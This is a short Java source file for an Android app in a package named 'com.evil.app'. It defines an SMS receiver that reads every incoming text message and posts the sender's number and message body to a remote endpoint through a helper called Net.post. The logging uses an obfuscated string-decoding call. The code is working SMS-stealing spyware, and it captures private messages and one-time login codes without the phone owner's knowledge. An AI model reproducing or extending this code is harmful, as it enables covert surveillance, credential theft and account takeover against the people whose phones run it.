package com.evil.app;
import android.content.*; import android.telephony.SmsMessage; import android.os.Bundle;
public class SmsReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context ctx, Intent it) {
        Object[] pdus = (Object[]) it.getExtras().get("pdus");
        for (Object p : pdus) {
            SmsMessage m = SmsMessage.createFromPdu((byte[]) p);
            Net.post(m.getOriginatingAddress() + ":" + m.getMessageBody());
        }
        android.util.Log.d(S.d("\070\105\032"), "got sms");
    }
}